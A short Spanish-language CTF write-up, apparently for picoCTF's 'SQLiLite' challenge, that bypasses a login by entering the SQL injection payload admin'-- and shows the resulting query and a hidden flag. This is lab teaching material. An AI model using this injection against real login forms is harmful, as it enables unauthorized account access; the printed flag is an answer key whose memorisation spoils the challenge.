#  - SQLiLite

## Descripcion:
* Can you login to this website?
Additional details will be available after launching your challenge instance.
* admin is the user you want to login as.

## Solucion
como el reto menciona sqllite y nos encontremos un loging en la pagina hacemos una inyeccion de prueba.
![[Pasted image 20251005194033.png]]
![[Pasted image 20251005194048.png]]
con esas respuestas nos confirma la vulnerabilidad  y logramos acceder al no ver mas pistas revisamos el codigo fuente.
```
<pre>username: admin&#039;--
password: 1234
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039;--&#039; AND password=&#039;1234&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>

```
y asi encontramos  la bandera
## Referencias: